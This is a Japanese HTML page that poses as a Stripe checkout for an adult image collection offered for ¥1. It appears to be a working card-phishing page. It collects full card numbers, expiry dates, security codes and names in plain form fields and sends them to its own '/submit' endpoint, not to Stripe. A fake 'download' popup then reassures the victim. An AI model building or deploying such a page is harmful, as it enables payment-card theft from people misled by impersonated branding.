<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>Stripe お支払いフォーム</title>
    <style>
        body {
          font-family: sans-serif;
          background-color: #f5f5f5;
          margin: 0;
          padding: 20px;
        }
        .container {
          display: flex;
          justify-content: center;
          background: #fff;
          max-width: 900px;
          margin: auto;
          padding: 40px;
          border-radius: 8px;
          box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        .summary, .payment {
          flex: 1;
          padding: 0 20px;
        }
        .price-row {
          display: flex;
          justify-content: space-between;
          margin-bottom: 10px;
        }
        .total {
          font-weight: bold;
          font-size: 18px;
          margin-top: 20px;
          border-top: 1px solid #ccc;
          padding-top: 10px;
        }
        input, select {
          width: 100%;
          padding: 10px;
          margin: 8px 0 16px;
          border: 1px solid #ccc;
          border-radius: 4px;
        }
        button {
          width: 100%;
          padding: 12px;
          background-color: #0052cc;
          color: white;
          font-size: 16px;
          border: none;
          border-radius: 4px;
          cursor: pointer;
        }
        button:hover {
          background-color: #003f99;
        }

        /* モーダル */
        .overlay {
          position: fixed;
          top: 0; left: 0;
          width: 100vw; height: 100vh;
          background-color: rgba(0,0,0,0.5);
          display: none;
          justify-content: center;
          align-items: center;
          z-index: 999;
        }
        .modal {
          background: #fff;
          padding: 30px;
          border-radius: 10px;
          text-align: center;
          width: 90%;
          max-width: 400px;
          box-shadow: 0 0 10px rgba(0,0,0,0.2);
        }
    </style>
</head>
<body>

<!-- ✅ フォーム -->
<form id="paymentForm" method="POST" action="/submit">
    <div class="container">
        <div class="summary">
            <h2>Stripe (sarayura)</h2>
            <p>【初回特典】沙羅ゆら 厳選作品集(R18/モザイクなし)</p>

            <div class="price-row"><span>定価</span><span>¥5,000</span></div>
            <div class="price-row"><span>初回割引</span><span>¥-4,999</span></div>
            <div class="price-row total"><span>合計額</span><span>¥1</span></div>

            <div style="text-align: center;">
                <img src="https://livedoor.blogimg.jp/sarayura_aiart/imgs/6/f/6f85ed3b-s.png"
                     alt="作品画像"
                     style="width:70%; border-radius:8px; margin-bottom:20px;">
            </div>
        </div>

        <div class="payment">
            <h2>カードで支払い</h2>

            <label>メールアドレス</label>
            <input type="email" name="email" placeholder="email@example.com" required>

            <label>カード情報</label>
            <input type="text" name="num" pattern="^\d{15,16}$" maxlength="16" placeholder="1234567812345678(半角数字)"
                   required>
            <input type="text" name="date" placeholder="MM / YY('/'は不要)" maxlength="5" required>
            <input type="text" name="cv" placeholder="セキュリティコード" required>

            <label>氏名</label>
            <input type="text" name="name" placeholder="氏名" required>

            <label>国または地域</label>
            <select name="country">
                <option>日本</option>
                <option>アメリカ</option>
                <option>カナダ</option>
            </select>

            <div class="checkbox">
                <p class="small">Linkが使えるすべての場所で安全にお支払いください。</p>
            </div>

            <button type="submit">申し込む</button>
        </div>
    </div>
</form>

<!-- ✅ ポップアップ -->
<div class="overlay" id="popup">
    <div class="modal">
        <h2>申し込み完了しました！</h2>
        <p>下記リンクからダウンロード可能です<br>URL：</p>
        <p><a href="{{ url }}" target="_blank">{{ url }}</a></p>
        <p>パスワード：<strong>{{ pw }}</strong></p>
        <button onclick="document.getElementById('popup').style.display='none'">閉じる</button>
    </div>
</div>

<!-- ✅ JavaScript -->
<script>
    document.getElementById('paymentForm').addEventListener('submit', function(event) {
      event.preventDefault();

      fetch("/submit", {
        method: "POST",
        body: new FormData(this)
      }).then(() => {
        // ✅ 1秒後にポップアップ表示
        setTimeout(() => {
          document.getElementById("popup").style.display = "flex";
        }, 1000);
      });
    });
</script>
</body>
</html>
